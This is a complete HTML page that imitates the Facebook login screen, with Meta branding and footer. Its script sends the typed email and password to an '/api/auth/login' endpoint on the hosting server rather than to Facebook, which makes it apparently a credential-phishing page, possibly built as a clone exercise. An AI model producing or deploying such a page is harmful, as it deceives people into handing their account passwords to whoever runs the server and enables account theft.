<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Facebook Login</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Segoe UI, Arial, Helvetica, sans-serif;
}

body{
background:#f0f2f5;
min-height:100vh;
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
padding:20px;
}

/* TITLE */

.title{
font-size:42px;
font-weight:900;
color:#1877f2;
margin-bottom:25px;
text-align:center;
}

/* CARD */

.card{
background:white;
width:100%;
max-width:420px;
padding:32px;
border-radius:12px;
box-shadow:0 14px 40px rgba(0,0,0,0.15);
}

/* FLOATING INPUT */

.input-group{
position:relative;
margin-bottom:18px;
}

.input-group input{
width:100%;
padding:16px;
border-radius:8px;
border:1px solid #dddfe2;
font-size:16px;
background:white;
}

.input-group label{
position:absolute;
left:12px;
top:16px;
color:#65676b;
font-size:14px;
pointer-events:none;
background:white;
padding:0 4px;
transition:0.2s;
}

.input-group input:focus{
outline:none;
border-color:#1877f2;
box-shadow:0 0 0 3px rgba(24,119,242,0.15);
}

.input-group input:focus + label,
.input-group input:not(:placeholder-shown) + label{
top:-8px;
font-size:12px;
color:#1877f2;
}

/* ERROR */

.error{
display:none;
color:#d93025;
font-size:14px;
margin-bottom:10px;
text-align:center;
}

/* BUTTON */

.login-btn{
width:100%;
padding:15px;
border:none;
border-radius:8px;
background:#1877f2;
color:white;
font-size:17px;
font-weight:bold;
cursor:pointer;
transition:0.2s;
}

.login-btn:hover{
background:#166fe5;
}

.login-btn.loading{
background:#9bbcf5;
cursor:not-allowed;
}

/* DIVIDER */

.divider{
height:1px;
background:#e4e6eb;
margin:22px 0;
}

/* CREATE ACCOUNT */

.create-btn{
width:100%;
padding:13px;
border:none;
border-radius:8px;
background:#42b72a;
color:white;
font-size:16px;
font-weight:bold;
cursor:pointer;
}

.create-btn:hover{
background:#36a420;
}

/* FOOTER */

.site-footer{
margin-top:40px;
text-align:center;
font-size:13px;
color:#737373;
}

.languages span,
.links span{
margin:0 8px;
cursor:pointer;
}

.languages{
margin-bottom:8px;
}

.footer-bottom{
margin-top:10px;
font-size:12px;
color:#8a8d91;
}

</style>

</head>

<body>

<h1 class="title">Facebook Login</h1>

<div class="card">

<div id="error" class="error">Login failed. Please try again.</div>

<div class="input-group">
<input id="email" placeholder=" ">
<label>Mobile number or email</label>
</div>

<div class="input-group">
<input id="password" type="password" placeholder=" ">
<label>Password</label>
</div>

<button id="loginBtn" class="login-btn" onclick="login()">Log In</button>

<div class="divider"></div>

<button class="create-btn">Create new account</button>

</div>

<div class="site-footer">

<div class="languages">
<span>English</span>
<span>Hausa</span>
<span>Français</span>
<span>Español</span>
<span>Português</span>
<span>العربية</span>
</div>

<div class="links">
<span>About</span>
<span>Privacy</span>
<span>Terms</span>
<span>Help</span>
<span>Developers</span>
<span>Careers</span>
</div>

<div class="footer-bottom">
© 2026 Meta · Privacy · Terms · Help
</div>

</div>

<script>

async function login(){

const email=document.getElementById("email").value
const password=document.getElementById("password").value
const btn=document.getElementById("loginBtn")
const error=document.getElementById("error")

error.style.display="none"

btn.classList.add("loading")
btn.innerText="Signing in..."

try{

const response=await fetch("/api/auth/login",{

method:"POST",
credentials:"include",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({
email:email,
password:password
})

})

const data=await response.json()

if(data.success){

window.location.href=data.redirect

}else{

error.style.display="block"
btn.classList.remove("loading")
btn.innerText="Log In"

}

}catch(err){

error.style.display="block"
btn.classList.remove("loading")
btn.innerText="Log In"

}

}

</script>

</body>
</html>
